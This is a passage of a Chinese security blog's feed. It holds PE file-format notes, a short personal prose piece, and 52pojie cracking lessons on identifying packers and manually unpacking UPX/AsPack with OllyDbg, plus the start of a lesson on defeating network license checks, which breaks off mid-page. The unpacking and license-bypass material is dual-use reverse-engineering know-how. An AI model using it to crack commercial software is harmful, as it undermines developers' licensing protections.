IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  &#x2F;&#x2F; File should only be run on a UP machine  </span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  &#x2F;&#x2F; Bytes of machine word are reversed. </span><br><span class="line">#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  &#x2F;&#x2F; Relocation info stripped from file.  </span><br><span class="line">#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  &#x2F;&#x2F; File is executable  (i.e. no unresolved externel references).  </span><br><span class="line">#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  &#x2F;&#x2F; Line nunbers stripped from file.  </span><br><span class="line">#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  &#x2F;&#x2F; Local symbols stripped from file.  </span><br><span class="line">#define IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  &#x2F;&#x2F; Agressively trim working set  </span><br><span class="line">#define IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  &#x2F;&#x2F; App can handle &gt;2gb addresses  </span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  &#x2F;&#x2F; Bytes of machine word are reversed.  </span><br><span class="line">#define IMAGE_FILE_32BIT_MACHINE             0x0100  &#x2F;&#x2F; 32 bit word machine.  </span><br><span class="line">#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  &#x2F;&#x2F; Debugging info stripped from file in .DBG file  </span><br><span class="line">#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  &#x2F;&#x2F; If Image is on removable media, copy and run from the swap file.  </span><br><span class="line">#define IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  &#x2F;&#x2F; If Image is on Net, copy and run from the swap file.  </span><br><span class="line">#define IMAGE_FILE_SYSTEM                    0x1000  &#x2F;&#x2F; System File.  </span><br><span class="line">#define IMAGE_FILE_DLL                       0x2000  &#x2F;&#x2F; File is a DLL.  </span><br><span class="line">#define IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  &#x2F;&#x2F; File should only be run on a UP machine  </span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  &#x2F;&#x2F; Bytes of machine word are reversed.</span><br></pre></td></tr></table></figure></div><h6 id="3-PE可选头"><a href="#3-PE可选头" class="headerlink" title="3.PE可选头"></a>3.PE可选头</h6><p>32位下  IMAGE_OPTIONAL_HEADER32</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;  </span><br><span class="line">    WORD    Magic;  </span><br><span class="line">    BYTE    MajorLinkerVersion;  </span><br><span class="line">    BYTE    MinorLinkerVersion;  </span><br><span class="line">    DWORD   SizeOfCode;  </span><br><span class="line">    DWORD   SizeOfInitializedData;  </span><br><span class="line">    DWORD   SizeOfUninitializedData;  </span><br><span class="line">    DWORD   AddressOfEntryPoint;  </span><br><span class="line">    DWORD   BaseOfCode;  </span><br><span class="line">    DWORD   BaseOfData;  </span><br><span class="line">    DWORD   ImageBase;  </span><br><span class="line">    DWORD   SectionAlignment;  </span><br><span class="line">    DWORD   FileAlignment;  </span><br><span class="line">    WORD    MajorOperatingSystemVersion;  </span><br><span class="line">    WORD    MinorOperatingSystemVersion;  </span><br><span class="line">    WORD    MajorImageVersion;  </span><br><span class="line">    WORD    MinorImageVersion;  </span><br><span class="line">    WORD    MajorSubsystemVersion;  </span><br><span class="line">    WORD    MinorSubsystemVersion;  </span><br><span class="line">    DWORD   Win32VersionValue;  </span><br><span class="line">    DWORD   SizeOfImage;  </span><br><span class="line">    DWORD   SizeOfHeaders;  </span><br><span class="line">    DWORD   CheckSum;  </span><br><span class="line">    WORD    Subsystem;  </span><br><span class="line">    WORD    DllCharacteristics;  </span><br><span class="line">    DWORD   SizeOfStackReserve;  </span><br><span class="line">    DWORD   SizeOfStackCommit;  </span><br><span class="line">    DWORD   SizeOfHeapReserve;  </span><br><span class="line">    DWORD   SizeOfHeapCommit;  </span><br><span class="line">    DWORD   LoaderFlags;  </span><br><span class="line">    DWORD   NumberOfRvaAndSizes;  </span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];  </span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure></div><p>Magic：表示可选头的类型。</p><p>MajorLinkerVersion和MinorLinkerVersion：链接器的版本号。</p><p>SizeOfCode：代码段的长度，如果有多个代码段，则是代码段长度的总和。</p><p>SizeOfInitializedData：初始化的数据长度。</p><p>SizeOfUninitializedData：未初始化的数据长度。</p><p>AddressOfEntryPoint：程序入口的RVA，对于exe这个地址可以理解为WinMain的RVA。对于DLL，这个地址可以理解为DllMain的RVA，如果是驱动程序，可以理解为DriverEntry的RVA。当然，实际上入口点并非是WinMain，DllMain和DriverEntry，在这些函数之前还有一系列初始化要完成，当然，这些不是本文的重点。</p><p>BaseOfCode：代码段起始地址的RVA。</p><p>BaseOfData：数据段起始地址的RVA。</p><p>ImageBase：映象（加载到内存中的PE文件）的基地址，这个基地址是建议，对于DLL来说，如果无法加载到这个地址，系统会自动为其选择地址。</p><p>SectionAlignment：节对齐，PE中的节被加载到内存时会按照这个域指定的值来对齐，比如这个值是0x1000，那么每个节的起始地址的低12位都为0。</p><p>FileAlignment：节在文件中按此值对齐，SectionAlignment必须大于或等于FileAlignment。</p><p>MajorOperatingSystemVersion、MinorOperatingSystemVersion：所需操作系统的版本号，随着操作系统版本越来越多，这个好像不是那么重要了。</p><p>MajorImageVersion、MinorImageVersion：映象的版本号，这个是开发者自己指定的，由连接器填写。</p><p>MajorSubsystemVersion、MinorSubsystemVersion：所需子系统版本号。</p><p>Win32VersionValue：保留，必须为0。</p><p>SizeOfImage：映象的大小，PE文件加载到内存中空间是连续的，这个值指定占用虚拟空间的大小。</p><p>SizeOfHeaders：所有文件头（包括节表）的大小，这个值是以FileAlignment对齐的。</p><p>CheckSum：映象文件的校验和。</p><p>Subsystem：运行该PE文件所需的子系统。</p><p>DllCharacteristics：DLL的文件属性，只对DLL文件有效</p><h4 id="节段（区）头"><a href="#节段（区）头" class="headerlink" title="节段（区）头"></a>节段（区）头</h4><p>PE文件有不同的节段：code（代码），data（数据），resource（资源），这样设计避免了很多安全问题，比如向data写数据，由于某原因导致溢出，其下的code就会被覆盖，程序就会崩溃。</p><p>code/data/resource都有不同的权限，如下：<a href="https://i.loli.net/2018/07/14/5b49c77233db3.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49c77233db3.jpg" class="lazyload"></a></p><p>节段头是由IMAGE_SECTION_HEADER结构体组成的数组，每个结构体对应一个节段。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">  union &#123;</span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;</span><br><span class="line">  &#125; Misc;</span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD SizeOfRawData;</span><br><span class="line">  DWORD PointerToRawData;</span><br><span class="line">  DWORD PointerToRelocations;</span><br><span class="line">  DWORD PointerToLinenumbers;</span><br><span class="line">  WORD  NumberOfRelocations;</span><br><span class="line">  WORD  NumberOfLinenumbers;</span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure></div><p>VirtualAddress与PointerToRawData不带有任何值，分别由（定义在IMAGE_OPTIONAL_HEADER32中的）SectionAlignment和FileAlignment确定。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;PE文件&quot;&gt;&lt;a href=&quot;#PE文件&quot; class=&quot;headerlink&quot; title=&quot;PE文件&quot;&gt;&lt;/a&gt;PE文件&lt;/h1&gt;&lt;p&gt;PE文件的全称是Portable</summary>
        
      
    
    
    
    <category term="计算机系统" scheme="https://kabeor.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="PE" scheme="https://kabeor.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/PE/"/>
    
    
    <category term="PE" scheme="https://kabeor.github.io/tags/PE/"/>
    
    <category term="FreeBuf" scheme="https://kabeor.github.io/tags/FreeBuf/"/>
    
    <category term="系统" scheme="https://kabeor.github.io/tags/%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>You</title>
    <link href="https://kabeor.github.io/You/"/>
    <id>https://kabeor.github.io/You/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:51:45.806Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://i.loli.net/2018/07/14/5b49f6bd8165a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49f6bd8165a.jpg" class="lazyload"></a></p><p>The universe is big. </p><p>It’s vast and complicated and ridiculous, </p><p>And sometimes, very rarely, </p><p>Impossible things just happen and we call them miracle </p><p>And that’s the theory.</p><p>Because this exact leaf had to grow in that exact way in that exact place so that precise wind could tear it from that precise branch and make it fly into this exact face at that exact moment.And if just one of those tiny little things had never happened,I’d never have met you.</p><p>天空是火红的橙色，城堡的大玻璃屋顶，在两颗太阳的照耀下熠熠生辉，远处连绵不断的山坡上，长满了深红色的草，覆盖着皑皑白雪。我们在充满孢子的林间奔跑，在冷却塔顶抬头仰望，看着气闭舱室外星舰的启程与归途。</p><p>组成你身体的所有元素都是千百万年前在一颗遥远的星球核心里造就的，那颗星星后来爆炸了，逝去了。爆炸使得那些元素四散开来，遍布在宇宙深处的荒原中。自那以后，经过了上百万年，这些元素又重新聚在一起形成了新的恒星与行星。就这么随着时间周而复始，这些元素聚合起来又分崩离析，构成了鞋子、船只、封口蜡以及王，直到最后它们聚在一起构成了你。你是宇宙中最独特的。世上只有一个Lisa，绝不会再有第二个。</p><p>Become stories,when we forget them. </p><p>Maybe some of them become songs. </p><p>没有事情会被完全遗忘，如果能回忆起来，就能重新得到。</p><p>此时的我仰望星空，我看到了那颗发着特殊光芒的星，那是你所在的星，我相信你也在那里的一颗长石上看着我。</p><p>Forgetfulness is the superpower of mankind.</p><p>But</p><p>Remember me,for we shall meet again.</p><p>With a better ending.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://i.loli.net/2018/07/14/5b49f6bd8165a.jpg&quot; data-fancybox=&quot;group&quot; data-caption=&quot;mark&quot; class=&quot;fancybox&quot;&gt;&lt;img alt=&quot;mark&quot;</summary>
        
      
    
    
    
    
    <category term="You" scheme="https://kabeor.github.io/tags/You/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解培训第一课：破解基础知识之介绍常见工具和壳的特征</title>
    <link href="https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E7%A0%B4%E8%A7%A3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B9%8B%E4%BB%8B%E7%BB%8D%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E5%92%8C%E5%A3%B3%E7%9A%84%E7%89%B9%E5%BE%81/"/>
    <id>https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9A%E7%A0%B4%E8%A7%A3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B9%8B%E4%BB%8B%E7%BB%8D%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E5%92%8C%E5%A3%B3%E7%9A%84%E7%89%B9%E5%BE%81/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:36:54.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱破解培训第一课：破解基础知识之介绍常见工具和壳的特征"><a href="#吾爱破解培训第一课：破解基础知识之介绍常见工具和壳的特征" class="headerlink" title="吾爱破解培训第一课：破解基础知识之介绍常见工具和壳的特征"></a>吾爱破解培训第一课：破解基础知识之介绍常见工具和壳的特征</h1><h3 id="1-不同编译器反汇编入口点特点"><a href="#1-不同编译器反汇编入口点特点" class="headerlink" title="1.不同编译器反汇编入口点特点"></a>1.不同编译器反汇编入口点特点</h3><p>1.VC6编译无壳程序</p><blockquote><p>   VC6特点：入口点代码是固定的代码，入口调用的API也是相同的，其中有的push地址不同程序可能不同；区段有四个也是固定的.text、.rdata、.data和.rsrc。<a href="https://i.loli.net/2018/07/14/5b49c1f1042d4.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f1042d4.jpg" class="lazyload"></a><br>   <a href="https://i.loli.net/2018/07/14/5b49c2418da8e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c2418da8e.jpg" class="lazyload"></a></p></blockquote><p>2.VS2008和VS2013编译无壳程序</p><blockquote><p>VS特点：入口点只有两行代码，一个CALL后直接JMP，第一个CALL进去后调用的API也是相同的；区段相对于VC6多了一个.reloc。<br><a href="https://i.loli.net/2018/07/14/5b49c241a00d9.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c241a00d9.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/14/5b49c241b185a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c241b185a.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/14/5b49c241e4e8c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c241e4e8c.jpg" class="lazyload"></a></p></blockquote><p>3.易语言编译无壳程序（独立编译和非独立编译）（由于易语言独立编译是调用VC的链接程序编译的，所以从区段和入口代码特征和VC相同）<br><a href="https://i.loli.net/2018/07/14/5b49c24202933.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c24202933.jpg" class="lazyload"></a></p><blockquote><p>易语言特点：可以从程序里找一些call的调用最终都会走到上面核心代码图位置（文字不太好表达），这个方法可以区分和VC的区别，非独立编译比较容易识别，入口特征和模块特征都有krnln.fnr。<a href="https://i.loli.net/2018/07/14/5b49c242162ee.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c242162ee.jpg" class="lazyload"></a></p></blockquote><p>查看模块<a href="https://i.loli.net/2018/07/14/5b49c2422a136.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c2422a136.jpg" class="lazyload"></a></p><p>查看核心代码<br><a href="https://i.loli.net/2018/07/14/5b49c2423aee3.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c2423aee3.jpg" class="lazyload"></a></p><p>4.Delhpi编译无壳程序</p><h3 id="2-如何识别加壳"><a href="#2-如何识别加壳" class="headerlink" title="2.如何识别加壳"></a>2.如何识别加壳</h3><p>1.通过PEiD、Exeinfo PE等查壳工具内置各种壳的十六进制特征码进行对比查壳</p><p>2.通过入口特征和区段特征来识别</p><blockquote><p>区段信息可以通过PEiD的EP处点击获取到。</p></blockquote><blockquote><p>入口特征可以通过OllyDBG载入获得，载入后可以按一下“Ctrl+A”，让OD分析一下代码，就可以把入口点一些特征字符串分析出来</p></blockquote><h3 id="3-程序加的是什么壳"><a href="#3-程序加的是什么壳" class="headerlink" title="3.程序加的是什么壳"></a>3.程序加的是什么壳</h3><p>windows程序状态大体可以分为以下几种类型：未加壳、压缩壳、传统加密壳、代码虚拟化保护、.Net程序加密</p><blockquote><p>==OD快捷键== </p></blockquote><ol><li>l：日志信息</li><li>e：模块加载</li><li>m：内存窗口</li><li>t：线程</li><li>w：窗口</li><li>h：句柄</li><li>c：CPU</li><li>p：补丁</li><li>k：调用堆栈</li><li>b：断点窗口</li><li>r：参考</li><li>…：run跟踪</li><li>s：源码</li></ol><blockquote><p>API函数</p></blockquote><p>API（Application Programming Interface,应用程序编程接口）是一些预先定义的函数，目的是提供应用程序与开发人员基于某软件或硬件得以访问一组例程的能力，而又无需访问源码，或理解内部工作机制的细节。</p><h2 id="手脱UPX，AsPack"><a href="#手脱UPX，AsPack" class="headerlink" title="手脱UPX，AsPack"></a>手脱UPX，AsPack</h2><p>UPS、AsPack压缩壳介绍：</p><p>　　　UPX 、AsPack是一款先进的可执行程序文件压缩器。压缩过的可执行文件体积缩小50%-70% ，这样减少了磁盘占用空间、网络上传下载的时间和其它分布以及存储费用。 通过压缩过的程序和程序库完全没有功能损失，和压缩之前一样可正常地运行。对于支持的大多数格式没有运行时间或内存的不利后果。</p><p>　　1、单步跟踪法</p><p>　　　　　此方法是将向上跳转设置断点让它不能实现，向下跳转不执行动作让它实现。<br><a href="https://i.loli.net/2018/07/14/5b49c2425c093.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c2425c093.jpg" class="lazyload"></a>　　</p><p>　　　　将程序拖入OP，可以看到Pushad是这个程序的入口点。接下来按F8（单步步过）或者点击此按钮即可。<br><a href="https://i.loli.net/2018/07/14/5b49c1f118e2f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f118e2f.jpg" class="lazyload"></a><br>　　　　单步跟踪法是将向上跳转设置断点，所以我们就用F8逐一的找向上跳转。<br><a href="https://i.loli.net/2018/07/14/5b49c1f12c039.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f12c039.jpg" class="lazyload"></a></p><p>　　　　红色椭圆框住的就是向上跳转，每当遇见的时候通常我们都在下一句设置断点，所以我们可以直接在下一句（即红色矩形框框住部分）按F4，逐步向下寻找。<br><a href="https://i.loli.net/2018/07/14/5b49c1f1400ec.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f1400ec.jpg" class="lazyload"></a></p><p>　　　　这个跳转因为下一句是一个“CALL”所以我们在CALL下面的一句设置断点。这里注意一下popad。这个是“出站口”，注意到前面pushad是“入站口”，有入站口就会有出站口即popad。再看popad下面的语句，98E1EFFF，0047738C，这个跨度比较大，典型的Delphi程序，一般再单步步进一次就可以进入到程序的真正程序段。<br><a href="https://i.loli.net/2018/07/14/5b49c1f154509.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f154509.jpg" class="lazyload"></a>　　</p><p>　　接下来我们进行脱壳，可以直接用OD脱壳插件脱壳，右键用OllyDump脱壳调试进程。</p><p><a href="https://i.loli.net/2018/07/14/5b49c1f167b76.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f167b76.jpg" class="lazyload"></a></p><p> 　　可以用方式1，也可以用方式2，都可以进行脱壳。</p><p>　　</p><p>　　　2、ESP大法</p><p> 　　　　ESP大法相比于单步跟踪法来说简便，利用寄存器ESP的值来进行脱壳。</p><p>　　　　 首先来看程序入口点，关键语句Pushad。<br><a href="https://i.loli.net/2018/07/14/5b49c1f179b12.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f179b12.jpg" class="lazyload"></a></p><p>　　　　 ESP大法是在关键语句的下一句如果ESP颜色突变进行操作，我们来看一下下一语句的ESP。<br><a href="https://i.loli.net/2018/07/14/5b49c1f18ba66.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f18ba66.jpg" class="lazyload"></a></p><p>　　　　 这里我们看到寄存器里只有ESP是红色的，那我们就可以操作了。右键数据窗口中跟随。<br><a href="https://i.loli.net/2018/07/14/5b49c1f19d60f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f19d60f.jpg" class="lazyload"></a></p><p>　　　　 在数据窗口中进行如下操作，word Dword都可以。<br><a href="https://i.loli.net/2018/07/14/5b49c1f1af0c1.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f1af0c1.jpg" class="lazyload"></a></p><p>　　　　 然后我们F9运行，来到了我们刚才熟悉的界面，单步步进，来到了主程序程序段，脱壳即可。<br><a href="https://i.loli.net/2018/07/14/5b49c1f9785df.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f9785df.jpg" class="lazyload"></a></p><p> 　　　　 3、内存2次镜像法<br><a href="https://i.loli.net/2018/07/14/5b49c1f98bce3.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f98bce3.jpg" class="lazyload"></a>　　　　</p><p>　　　　　　点击m进入内存界面，接下来我们找在内存中的本程序段的.rsrc，F2设置断点，运行。<br><a href="https://i.loli.net/2018/07/14/5b49c1f99ef0e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f99ef0e.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/14/5b49c1f9b2f2c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f9b2f2c.jpg" class="lazyload"></a></p><p>　　　　 　</p><p>　　　　　　所谓2次镜像法就是要进行2次内存操作，接下来我们再点m进入内存信息界面，找到地址00401000，F2设置断点，运行。又来到了我们熟悉的语句popad，设置断点，单步步进，脱壳。</p><p><a href="https://i.loli.net/2018/07/14/5b49c1f9c699f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/14/5b49c1f9c699f.jpg" class="lazyload"></a></p><p>　　　　　　4、一步直达法</p><p> 　　　　　　此方法适用于UPX,Aspack壳，前面说过pushad为入口点，那么它必定有一个出口点popad，所以我们只需要Ctrl+f查找popad即可。 </p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;吾爱破解培训第一课：破解基础知识之介绍常见工具和壳的特征&quot;&gt;&lt;a href=&quot;#吾爱破解培训第一课：破解基础知识之介绍常见工具和壳的特征&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="吾爱破解培训" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="脱壳，破解" scheme="https://kabeor.github.io/tags/%E8%84%B1%E5%A3%B3%EF%BC%8C%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解培训第七课：手把手教你从实例看如何攻破常见的网络验证</title>
    <link href="https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%83%E8%AF%BE%EF%BC%9A%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E4%BB%8E%E5%AE%9E%E4%BE%8B%E7%9C%8B%E5%A6%82%E4%BD%95%E6%94%BB%E7%A0%B4%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81/"/>
    <id>https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%83%E8%AF%BE%EF%BC%9A%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E4%BB%8E%E5%AE%9E%E4%BE%8B%E7%9C%8B%E5%A6%82%E4%BD%95%E6%94%BB%E7%A0%B4%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:36:31.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱破解培训第七课：手把手教你从实例看如何攻破常见的网络验证"><a href="#吾爱破解培训第七课：手把手教你从实例看如何攻破常见的网络验证" class="headerlink" title="吾爱破解培训第七课：手把手教你从实例看如何攻破常见的网络验证"></a>吾爱破解培训第七课：手把手教你从实例看如何攻破常见的网络验证</h1><blockquote><p>协议：</p></blockquote><p>网络验证协议分为UDP和TCP协议。</p><p>目前市面上流行的网络验证一半都是TCP协议的。</p><p>采用TCP协议程序发送数据所用API为：send，接收数据所用API为：recv<br>采用UDP协议程序发送数据所用API为：WSASend，接收数据所用API为：WSARecv</p><p>在分析封包时，了解程序使用的协议类型，采用相对应抓包工具。有的抓包工具只能抓到TCP协议发送的封包数据，比如用易语言网截所写的抓包工具，那种工具只能抓到TCP协议的封包</p><h6 id="TCP-（传输控制协议）"><a href="#TCP-（传输控制协议）" class="headerlink" title="TCP （传输控制协议）"></a>TCP （传输控制协议）</h6><p>TCP（Transmission Control Protocol 传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由IETF的RFC 793定义。在简化的计算机网络OSI模型中，它完成第四层传输层所指定的功能，用户数据报协议（UDP）是同一层内 另一个重要的传输协议。在因特网协议族（Internet protocol suite）中，TCP层是位于IP层之上，应用层之下的中间层。不同主机的应用层之间经常需要可靠的、像管道一样的连接，但是IP层不提供这样的流机制，而是提供不可靠的包交换。</p><p>应用层向TCP层发送用于网间传输的、用8位字节表示的数据流，然后TCP把数据流分区成适当长度的报文段（通常受该计算机连接的网络的数据链路层的最大传输单元（[1]  MTU）的限制）。之后TCP把结果包传给IP层，由它来通过网络将包传送给接收端实体的TCP层。TCP为了保证不发生丢包，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的包发回一个相应的确认（ACK）；如果发送端实体在合理的往返时延（RTT）内未收到确认，那么对应的数据包就被假设为已丢失将会被进行重传。TCP用一个校验和函数来检验数据是否有错误；在发送和接收时都要计算校验和。</p><h6 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h6><p>UDP 是User Datagram Protocol的简称， 中文名是用户数据报协议，是OSI（Open System Interconnection，开放式系统互联） 参考模型中一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务，IETF RFC 768是UDP的正式规范。UDP在IP报文的协议号是17。</p><p>UDP协议全称是用户数据报协议，在网络中它与TCP协议一样用于处理数据包，是一种无连接的协议。在OSI模型中，在第四层——传输层，处于IP协议的上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。UDP用来支持那些需要在计算机之间传输数据的网络应用。包括网络视频会议系统在内的众多的客户/服务器模式的网络应用都需要使用UDP协议。UDP协议从问世至今已经被使用了很多年，虽然其最初的光彩已经被一些类似协议所掩盖，但是即使是在今天UDP仍然不失为一项非常实用和可行的网络传输层协议。</p><p>与所熟知的TCP（传输控制协议）协议一样，UDP协议直接位于IP（网际协议）协议的顶层。根据OSI（开放系统互连）参考模型，UDP和TCP都属于传输层协议。UDP协议的主要作用是将网络数据流量压缩成数据包的形式。一个典型的数据包就是一个二进制数据的传输单位。每一个数据包的前8个字节用来包含报头信息，剩余字节则用来包含具体的传输数据。</p><blockquote><p>网络验证类型</p></blockquote><h6 id="Asp验证"><a href="#Asp验证" class="headerlink" title="Asp验证"></a>Asp验证</h6><h6 id="php验证"><a href="#php验证" class="headerlink" title="php验证"></a>php验证</h6><h6 id="云验证"><a href="#云验证" class="headerlink" title="云验证"></a>云验证</h6><h6 id="exe程序互相通信验证"><a href="#exe程序互相通信验证" class="headerlink" title="exe程序互相通信验证"></a>exe程序互相通信验证</h6><blockquote><p>判断验证类型</p></blockquote><p>Asp验证  飘零网络验证</p><p>Php验证  可可网络验证</p><p>云验证    注册宝网络验证</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><blockquote><p>易语言按钮事件</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa 